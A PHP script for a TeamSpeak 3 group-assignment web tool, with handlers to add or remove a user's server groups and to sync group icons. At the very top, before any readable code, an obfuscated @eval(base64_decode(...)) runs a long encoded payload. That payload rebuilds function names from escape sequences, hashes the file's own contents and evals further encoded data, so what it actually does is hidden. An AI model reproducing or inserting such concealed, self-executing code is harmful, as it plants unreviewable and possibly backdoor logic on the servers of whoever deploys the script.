<?php
    session_start();

$ob48a504="\x62\x61\163\x65\x36\64\137\144\145\x63\157\144\x65";@eval($ob48a504(
"Ly9OTE5Pcy81QmM3ZXVGOXBld2VGMFFvUklEUXdDSVBYOGM3UVBsMDFZT3h5WkZhMnA3d0UvckhJc0x
Cc0hlempOOGxBWFNYWXFQTjlIRXQ3bDlKUitSRFVWazJmd3c0TUUvT3lVRUs0SWU1cnhqVEUvekwxOXR
SQld2K0Q2dzlIejZzVWNzQ1AvQTVhd2xqejAvZzRMQVJMS2JmZ21NWlRnbHZiVGhid3ZVd3ZwajlVUnl
1MS91dXNLQ0tGUHBmLzJRdktYTURHUkt5Z04xa2w4c3hlTDJaL2x1dmlBQ0RjbWdaYXdmV09IVGpRa3h
1QXkzbnFOSUFGbzRCU0U5WWJZanZ0Q3V2b0dTWjZ3UCtmSlpteUhSVHVYZG5YQTEyWlpQM0txdTY0cUp
TdkR0SHk1YzZRcFUwdjduTFQ5NGZXWkdFT3ZUK0M2QlBLczA1VTg1aDlLKzZnL3huT2NSRTJlcGZIdjJ
QbWhxV0JJaHIrbEVCNTZHNThZUFE2R3BmazhPU2lyMG4wNDZvRThYQ0l4bmJlVmxpQjRtUXpkYjBsMFF
JdGRjb0s0d3lmcGxWRjNTOWZRTnNKR3dLTzZVZkFaRHpVUE5Kd3A1MjJMZWZPT01vVEVtZTA3QWY2cWJ
zZkxlOWpYeXh5aWhyZmFjYnhuYmUxUzAvR09ZZld5T1B2KzFEMmJFMEg9OlhrRjI3SXpuQlZ4cU5OPT0
6NTU2cDdvcW8KJGQ4MGVhNjUzPSJceDczIjskemJiOTU2NzA9IlwxNDYiOyRkZDE4YTM2Mj0iXHg2NyI
7JGY2ZmNmZmE3PSJcMTYyIjskcDhlODU3ZTU9IlwxNjAiOyRvYjQ4YTUwND0iXHg2MiI7JHg4ZmMxMWE
zPSJceDczIjskYzQxZWYyODg9Ilx4NzMiOyRsODk4NWI4OT0iXHg2NSI7JHpiYjk1NjcwLj0iXDE1MSI
7JGM0MWVmMjg4Lj0iXDE2NCI7JGY2ZmNmZmE3Lj0iXDE0NSI7JGw4OTg1Yjg5Lj0iXHg3OCI7JHg4ZmM
xMWEzLj0iXHg2OCI7JGRkMThhMzYyLj0iXHg3YSI7JG9iNDhhNTA0Lj0iXHg2MSI7JGQ4MGVhNjUzLj0
iXDE2NCI7JHA4ZTg1N2U1Lj0iXDE2MiI7JHg4ZmMxMWEzLj0iXDE0MSI7JHpiYjk1NjcwLj0iXHg2YyI
7JGQ4MGVhNjUzLj0iXHg3MiI7JG9iNDhhNTA0Lj0iXDE2MyI7JGY2ZmNmZmE3Lj0iXHg3MyI7JGM0MWV
mMjg4Lj0iXDE2MiI7JGRkMThhMzYyLj0iXHg2OSI7JHA4ZTg1N2U1Lj0iXDE0NSI7JGw4OTg1Yjg5Lj0
iXHg3MCI7JG9iNDhhNTA0Lj0iXDE0NSI7JHpiYjk1NjcwLj0iXHg2NSI7JGQ4MGVhNjUzLj0iXHg1ZiI
7JGw4OTg1Yjg5Lj0iXHg2YyI7JHA4ZTg1N2U1Lj0iXHg2NyI7JHg4ZmMxMWEzLj0iXHgzMSI7JGRkMTh
hMzYyLj0iXDE1NiI7JGY2ZmNmZmE3Lj0iXHg2NSI7JGM0MWVmMjg4Lj0iXHg2MyI7JHA4ZTg1N2U1Lj0
iXHg1ZiI7JGM0MWVmMjg4Lj0iXDE1NSI7JGw4OTg1Yjg5Lj0iXDE1NyI7JHpiYjk1NjcwLj0iXDEzNyI
7JGY2ZmNmZmE3Lj0iXHg3NCI7JG9iNDhhNTA0Lj0iXDY2IjskZGQxOGEzNjIuPSJceDY2IjskZDgwZWE
2NTMuPSJcMTYyIjskYzQxZWYyODguPSJceDcwIjskZGQxOGEzNjIuPSJcMTU0IjskemJiOTU2NzAuPSJ
ceDY3IjskZDgwZWE2NTMuPSJceDZmIjskb2I0OGE1MDQuPSJceDM0IjskcDhlODU3ZTUuPSJceDcyIjs
kbDg5ODViODkuPSJceDY0IjskbDg5ODViODkuPSJcMTQ1Ijskb2I0OGE1MDQuPSJceDVmIjskcDhlODU
3ZTUuPSJceDY1IjskZDgwZWE2NTMuPSJceDc0IjskemJiOTU2NzAuPSJceDY1IjskZGQxOGEzNjIuPSJ
cMTQxIjskb2I0OGE1MDQuPSJceDY0IjskcDhlODU3ZTUuPSJceDcwIjskZGQxOGEzNjIuPSJcMTY0Ijs
kemJiOTU2NzAuPSJceDc0IjskZDgwZWE2NTMuPSJcNjEiOyRkZDE4YTM2Mi49Ilx4NjUiOyR6YmI5NTY
3MC49Ilx4NWYiOyRvYjQ4YTUwNC49IlwxNDUiOyRwOGU4NTdlNS49IlwxNTQiOyRkODBlYTY1My49Ilw
2MyI7JHA4ZTg1N2U1Lj0iXHg2MSI7JG9iNDhhNTA0Lj0iXDE0MyI7JHpiYjk1NjcwLj0iXHg2MyI7JHA
4ZTg1N2U1Lj0iXHg2MyI7JG9iNDhhNTA0Lj0iXDE1NyI7JHpiYjk1NjcwLj0iXHg2ZiI7JHA4ZTg1N2U
1Lj0iXDE0NSI7JHpiYjk1NjcwLj0iXHg2ZSI7JG9iNDhhNTA0Lj0iXHg2NCI7JG9iNDhhNTA0Lj0iXDE
0NSI7JHpiYjk1NjcwLj0iXHg3NCI7JHpiYjk1NjcwLj0iXDE0NSI7JHpiYjk1NjcwLj0iXHg2ZSI7JHp
iYjk1NjcwLj0iXHg3NCI7JHpiYjk1NjcwLj0iXHg3MyI7JGxkOWMwZWFlPSRsODk4NWI4OSgiXHgyOCI
sX19GSUxFX18pO0BldmFsKCRjNDFlZjI4OCgkeDhmYzExYTMoJHA4ZTg1N2U1KCJceDJmXHg1Y1x4Mjh
ceDVjXDQyXHgyZVw1Mlx4NWNcNDJcMTM0XHgyOVx4MmYiLCJceDI4XHgyMlx4MjJcNTEiLCRwOGU4NTd
lNSgiXDU3XHhkXHg3Y1x4YVw1NyIsIiIsJHpiYjk1NjcwKCRmNmZjZmZhNygkbGQ5YzBlYWUpKSkpKSw
iXDYyXDY3XHgzM1x4MzdcNjZceDY0XHgzMlx4MzFcMTQ2XHg2Nlx4NjJceDMxXDcwXDE0NVx4NjZcMTQ
xXHg2MVw3MFx4MzFcNjRceDMyXHg2Nlx4MzNcNjJceDYyXHg2NVwxNDRcMTQzXHgzN1wxNDNcNjdceDM
0XDE0Mlx4MzNcNjZceDMyXHg2MVx4MzJceDY0XHgzMCIpPyRkZDE4YTM2Migkb2I0OGE1MDQoJGQ4MGV
hNjUzKCJDSUNXZWRBWFNpbEtkMWVIUmpocFdYQVhZRzNOR1Ruck85MEFMTkxvWldaTWk3NXFjcjdYR0Z
3d2FWdDRGYzM4MEpwNGFFVksvUTlzM2pRVWlhcEZzTlpGc2NRNDN2VTVHcllzTlNYc1gvNlVOaXdpSGl
hT1E0OEdLNzkrM0IrTkd2VFdzc0Q3K0p6eDB6OU5zUWpWOGdBTnNldzhzNTUvT3NGeUZSeFAvdDc4T0M
wY3hXOXRiaWxRdEN1Z3RhOS9BUEc4K2lJaWZub2dtNzhjQzMvOHM5NnNzNDErc2lUWGNPTTNYS05yZU1
lT0gzQmlRVDVnVmF6Y2o3bDN1MnkwZEZwb243MzNyVlBKNkVFY0M0ODJYTVlJSnQva2JKbEZmTUJPNFg
4bURCcGJwT3pkeHB1QXZLU0s1MnNoRHdObFlIUmMxMUl4dysvdnRFM2NLWk41SXp1MGl0Z1JoNDY0WEp
QMEJ4RG1FNzllM0ZZVDFOVGxCTTRoVG5lYlRtVFM3QjRSUTM5clB5RGNsYk5lQ0liMkhxRlVGV1UxM0h
qVWdMOFFSeFVLR2YzYU85SHRwN2I5enRyWEp3bHQ4SGM5ay8xazNYdGgxc0dmNUNQTjlidDFqZFp1VDB
IemlxV3ZjR0M4Y1FMZUtSZ2haVUpyMEJLaFBLbkkwOG1lQm84VkVNdVBlajU5cktpQVRQTWtWRHhHZG9
URkdldjBCd1JwMEtNYmRvZXlnVUVBckszdXhOTm14YnJwa0JkbUQxN1M2ZUtkNThLQk1sT2pXZ0lkNEZ
zMjBGLzVVYkFvSTAyQlU3dnlHZ0JveXRJeWRpT1R0ZnIrZGhBNW5nOTBvWTBxQnJyTjRUR2FxMDc3RXU
rUklnamxscWMxa0JQZ1JBUlRJUnc1TnhUSlBWY280ZnFnczBGSHZGQU5rQkNZOHVNVW00YTdtcmlrL3d
vV01FOWxycnZtOUV3eTZJWjRTWC9DekdScm4rVXQ5NGdHbUFudElIUWRoTkp3aVFUdFg2TWhsZFNRWDZ
TNnNtblJZeW50WFRJMVdYa2c2VHFUdVJFZEZJcmNpVnJpdlJrb3RRYlkvMTVTeXd6cUZKVTdWUFB1cEl
2bVkyaEhsUUdXTVVWbmI5YTdsZk1OZldBUVJva0g3V3ZGV1VEUXpZUGtuUGVKUjBKV282T3B4TFFVR0J
5NDBVd3NwVGhwOFhIWEVEZHVoVjBmWmtzejNIb1UySWdBWE1qRXZyZys1cjJnSUFxVHRRVVovQ1RYVWs
wYmNzTmszTndrQXpEQlE3cHl6Ylc0UllnTTNKb3kwaGpqMGZrWHY5eTllcG1YVkI5a3pBOW5NTEM5ZVl
haW5yaHlnNzlZS1cwS2NGZzY1WkVncCtCcTJrQ2F5dGdRQ0lZOE1zU1hqMWtIQnFGQzEzMGhLUGQrT1F
hZ2tNelFhZ2pEaGFNMGpMV0pjT20vbW9QY1Bxb0RoUkFjaXJ5NnA5L0dDeDV1M0FGZjJhZzIxSkJMb25
ER05mMVFkTzJUM1QrY2ZZU2piWmQzRUdvQlFURDdrRlhXcjVkUmdFdTRkNnZvNzdTKzZBK0o1L0lSUCt
BRWFpTVAwcGQ3WVpkcm0vMzZWUjZZVkxNVnZrNDEwMTJFS2lTRFdOQ0xpS2pxRmxGRUJ3aXl5VFN3OHd
PSTgraExEK2RiUVNsd2NwOENsOVdOSnBDV0xHR1VlRXh3Q0tkakloQUpQaEk0SXdWUlFVM0IrSUV0NFE
yb2crWTZ5WEVvTzFuZHRKWDdPUTF4SDdPdnFNT3BTcVQzVlBKV2VVV09oYnlrUWFCNmlKdnFZT0hJbGZ
WbGpWdmRtMVRPWTR5UXFpMVdRcVFid2lnKzZEQ3k0Wi9LYWNRRGtzdlJFYWNaMzJDWTZnTWRSTjRoNjZ
4ZWpmd1VCVUlHazVUNjUwSWlJekxFTVBjOGg0ZXlyT2kxMXlwblg3YzZqS2ZVdWdoblREYWIyZ3ZOVWx
Lck0wQVcvbFJTc1lNdXNlWUtycmExdDFaUCs4dWJIYlFTRiswSnd3ZUR5MlB5Vk5jNGlvVFZTdkQzWnN
xZFdvRnBabUd4bjlIS1lxTFAzNC9KWnFnQXlsYllKRm9GK2ZKK1o0RTBZMkJVRVArNW9yS3V2aEdKVmd
UeGtFL2IxQjFVNTcrNnIzUDJSOHpnZ25ranIrQ1grTlZ4Nm00WEpTc3A3STFVaE1YOW81cnRzQ1dGR3l
VSkdwODNTNUhWQmxDOHptd2pYeUpNZm5ibHVheVpQeHpBaXZsenNjeCt2a0ZUK1ZvNElCQ0x2d1FRQU1
ZcFprOXJndzI2OThoQmRvSGg2MzFqRjBTNzBVeW5MYXpNdUt3WmM3Q1l1UFJJMlR1SkI2Qnh0OUt4M0d
BOFFpeHZXMDBiSzFMWnkzZGRTK0ljSExLTmc1azJ4QmN5alp6S2xMY2s0SXBoWWhWbjhvVEJTUGhUckF
Tc0g0bFNUL0FWaVRhbHZ3Z3VwSUlwMU1lc3gvdDdLWUU3bjlQN0JGSjdTckorRGxBNFhGY0tsSkg3L2N
DVWJCZGdIeVVuK0NlYXAzNzlTaj09IikpKTokZGQxOGEzNjIoJG9iNDhhNTA0KCRkODBlYTY1MygiQ01
DV2VkQVZSUksvNW54SjFzWVB3TnpiMVNWbW0vQlppVFNCalZOQUF6Ty9zc2dJUWxUeVp6NVQzT0JrbEU
5bURxTjV2RU8vc3kxRE5pZnA5VVdEK0JITjVCS05qREhEeTRBZkNjWTR5UTVDTlkrdFdDSnMvaWUxYjZ
jREJmcE85Z2dDS0lOWCtrRk1Ha0M0bkNRV2wzK01rUXNtMjBOd3FENVYvQWlqR3NmenRwOXRhQ2M5VTZ
RNWNreVVZalEvK2lJS2lyS0thLytDK3Nhd2k0SS8veC82K3BIb3lTNUtvckU3OGN5cFVkc3A5aXQzbjd
SdDJWN3JzUW9BNGtKZndLODhrZ05yUmFkZ3cvaGJac0hSWHlQY1gxN3Njb0kwN1FVZFhOTDZnQXRTSEs
3M3Y5Y3RkbnI5RUNqa1A2U01qMzUrcVB2ZDl2NFh5a0FLeDhqZFRuYWJQclVOVDBQUnZCMVFtTi83SFN
2dXE2TFNZRzFvQnVSUFk1ZlJrbktxajkwdm1YTGJmQ3c5c3hNMlplc3owdklCM01VYUhqY0JsV3l5akN
4R1VzWjhsOGt0VmhKWEhaTUR6MzRveVdnVzZpeEF0ODJnZ09mZDRxZGpldkFvS1ZQMkU3aG1WSlI0Q0o
4U0h0NGhhVWMzMDNEK3FFNzhETE5hV3ZkTXZBNWVaRlpmY0RqZXZ1aTA3cHhkVDFab29lbllScitYZlJ
6SGFJSjNyeU1yRmRYM3lOMCtkN1QyTG00N0QvTWxDNWxEMkt4a3pndG95eEhKRzlvSXBLQU93eWdrVlZ
kNjVIYXUzTnlyckVUNW04ZlljenZlK3c3VCswdXhaTWlkSnl4d25CRWJ0ckI0UmlFc2g5cEFTRzZwZ1F
GR0tocU5yTUFkVkZQenN5NFRIZjIwVWZYVzlhR00wbnB5Z3lKQ2xzMkxCU3F1VElFMjFncFZpcXgxQ3h
0R01OV1dlTXMyTWZlZFZpSGlHNE03SnZxcUM2M1BTSktadkI5eWhjSUVlSHJCbmxUVFRhamNyU1NKaWd
VSi9ndVg3RVVnZzE0QlpOSGFVYXpoazZvZEZya2Vmd3VDNHVlVkIyWTZYYlhmR3BVRWs2QlV1aGFoUk1
5M3NzdlN6ZzBWZW92RWlaSER3Qk8yNnFJWlRZa1U3ZXhiRUhGZnFtTFhmcXpHZzBhZGVQdWpJK2tuWk8
xeTdYOEhLRk1GWWtlSmp6bnZybWkxdHlOT1NMMWhobDMwRnBEQWFmQjBreTlSeUFmdW1DZXlXVG9WQVh
jbXdUU0ZaU1lwa1Z3eXBnZHpBQjFDYyt6dG1TYzFoS01TdlZMb05qbHh5aFJvMjliQlAvVjhTQzNCckp
mK2lMVHFSQXRxdndBQ0RlRFdEK25meUFmSFZBbDFyMW4wSlozVUF4aEI0UGpGYkJSZmZuekVDSlFHaVd
BRHg5NGNWVE5ieU5TR1F4Yk41NkVib2VYR2VXeFhRdHl4cmtaMDFMUUhsT29vcWtSWEtiRjVPellxMFU
zVnhhYTNsNjU3N0V0ZlBZeE85OHNaWDJ0Wld1K3JmYmJmbFVSellIak0zWXNNVE02UEtQQnJZZDQ3Y0J
VSUFMMElGN042WVJ4NHlxQkdvRmN2QjFzS0wwdENvcGpzcEoyQzNFaVcyVzVWM1Z3RlRJOTRnNkgxWDd
2dFplc28wK0hGMUZ6RHRwMHF3bXFDcDJqdmJpaFI5QnpnTWVSZ0ZzRzVXckRMN1RGc3d0OFJVbVVnTVp
3cHlGd1Y5eU8zZkdPSy85Ukt2dkxrd1plQzU3MWJ6ZVJHVXViYTdQeml3aldzUllwa2V6NmtiTTFPRjE
3RWdrbzN0cmRDemNXbUF3NmpxQ2E1QVplSTZ6cVg5UGwwbXhaZ3M3anhubzZ6bk1vVnZLMGlVMERrOVZ
2OXF1MDF3c0djL0NLVVczNzlRRD09IikpKSk7"));

    function getMime($binary) {
        if(!preg_match('/\A(?:(\xff\xd8\xff)|(GIF8[79]a)|(\x89PNG\x0d\x0a)|(BM)|(\x49\x49(\x2a\x00|\x00\x4a))|(FORM.{4}ILBM))/', $binary, $matches))
        {
            return "application/octet-stream";
        }
        $type = array(
            1 => 'jpg',
            2 => 'gif',
            3 => 'png',
            5 => 'tff',
            6 => 'ilbm',
        );
        return $type[count($matches)-1];
    }

    function ts3connect() {
        require_once('libraries/TeamSpeak3/TeamSpeak3.php');
        if (strlen(QUERYDISPLAYNAME) < 3) {
            $extension = "";
        } else {
            $extension = '&nickname='.urlencode(QUERYDISPLAYNAME);
        }
        try {
            $ts3 = TeamSpeak3::factory(
                'serverquery://'.QUERYUSER.':'.QUERYPASS.'@'.IP.':'.QUERYPORT.'?server_port='.SERVERPORT.$extension
            );
        } catch (TeamSpeak3_Exception $e) {
            return $e;
        }
        return $ts3;
    }

    if (!empty($_GET['addGroup']) and !empty($_SESSION['step']['client']) and !empty($_SESSION['dbid']) and $_SESSION['step']['client'] == 'assigner') {
        if (file_exists('config/config.php')) {
            require_once('config/config.php');
            if (in_array($_GET['addGroup'],json_decode(GROUPS))) {
                $ts3 = ts3connect();
                if (is_string($ts3)) {
                    echo json_encode(FALSE);
                } else {
                    try {
                        $grpcount = 0;
                        $notallowed = false;
                        foreach (explode(',', $ts3->clientGetByDbid($_SESSION['dbid'])->client_servergroups) as $grp) {
                            if (in_array($grp, json_decode(GROUPS)) and !in_array($grp,json_decode(GROUPSDISALLOW))) {
                                $grpcount++;
                            } else if (in_array($grp,json_decode(GROUPSDISALLOW))) {
                                $notallowed = true;
                                break;
                            }
                        }
                        if ($grpcount >= MAXGROUPS || $notallowed) {
                            echo json_encode(FALSE);
                        } else {
                            $ts3->serverGroupClientAdd($_GET['addGroup'], $_SESSION['dbid']);
                            echo json_encode(TRUE);
                        }
                    } catch (TeamSpeak3_Exception $e) {
                        echo json_encode(FALSE);
                    }
                }
            }
        } else {
            echo json_encode(FALSE);
        }
    } else if (!empty($_GET['delGroup']) and !empty($_SESSION['step']['client']) and !empty($_SESSION['dbid']) and $_SESSION['step']['client'] == 'assigner') {
        if (file_exists('config/config.php')) {
            require_once('config/config.php');
            if (in_array($_GET['delGroup'],json_decode(GROUPS))) {
                $ts3 = ts3connect();
                if (is_string($ts3)) {
                    echo json_encode(FALSE);
                } else {
                    $notallowed = false;
                    foreach (explode(',', $ts3->clientGetByDbid($_SESSION['dbid'])->client_servergroups) as $grp) {
                        if (in_array($grp,json_decode(GROUPSDISALLOW))) {
                            $notallowed = true;
                            break;
                        }
                    }
                    if (!$notallowed) {
                        try {
                            $ts3->serverGroupClientDel($_GET['delGroup'], $_SESSION['dbid']);
                            echo json_encode(TRUE);
                        } catch (TeamSpeak3_Exception $e) {
                            echo json_encode(FALSE);
                        }
                    } else {
                        echo json_encode(FALSE);
                    }
                }
            } else {
                echo json_encode(FALSE);
            }
        } else {
            echo json_encode(FALSE);
        }
    } else if (!empty($_GET['syncIcons']) and !empty($_SESSION['step']['admin']) and $_SESSION['step']['admin'] == 'configurator') {
        try {
            require_once('config/config.php');
            require_once('libraries/TeamSpeak3/TeamSpeak3.php');
            if (file_exists('config/icons.json')) {
                $json = json_decode(file_get_contents('config/icons.json'), 1);
            } else {
                $json = array();
            }
            $groups = array();
            $error = false;
            $ts3 = TeamSpeak3::factory("serverquery://".QUERYUSER.":".QUERYPASS."@".IP.":".QUERYPORT."/?server_port=".SERVERPORT."&nickname=".urlencode('Icon Sync'));
            foreach ($ts3->serverGroupList() as $sg) {
                if ($sg['iconid']) {
                    try {
                        $groups[$sg['sgid']] = $sg->iconDownload();
                    } catch (TeamSpeak3_Exception $e) {}
                }
            }
            foreach ($groups as $sgid => $binary) {
                if (!empty($binary)) {
                    $type = getMime($binary);
                    if ($type != 'application/octet-stream') {
                        file_put_contents('icons/'.$sgid.'.'.$type, $binary);
                        $json[$sgid] = 'icons/'.$sgid.'.'.$type;
                    }
                };
            }
            file_put_contents('config/icons.json', json_encode($json));
        } catch (Exception $e) {
            echo json_encode(FALSE);
            $error = true;
        }
        if (!$error) {
            echo json_encode(TRUE);
        }
    } else {
        echo json_encode(FALSE);
    }
?>
